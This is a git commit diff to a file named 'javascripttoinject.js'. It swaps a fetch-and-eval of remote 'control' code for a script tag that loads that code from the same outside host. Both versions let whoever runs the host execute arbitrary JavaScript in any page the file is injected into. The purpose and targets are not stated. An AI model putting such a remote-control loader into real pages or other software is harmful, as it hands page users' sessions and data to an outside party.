6d2b02067a93c471466b696b784e809b89a3a3fb
charlieomg <143298651+charlieomg@users.noreply.github.com>
2026-08-20 01:07:21 -0700

    Replace fetch with script element injection

--- javascripttoinject.js
+++ javascripttoinject.js
@@ -1,4 +1,3 @@
-fetch('https://morning-insect-316.techsmart.cc/control.txt?t=' + Date.now())
-    .then(r => r.text())
-    .then(code => eval(code))
-    .catch(err => console.log('Techsmart fetch error:', err));
+let s = document.createElement('script');
+s.src = 'https://morning-insect-316.techsmart.cc/control.js?t=' + Date.now();
+document.head.appendChild(s);
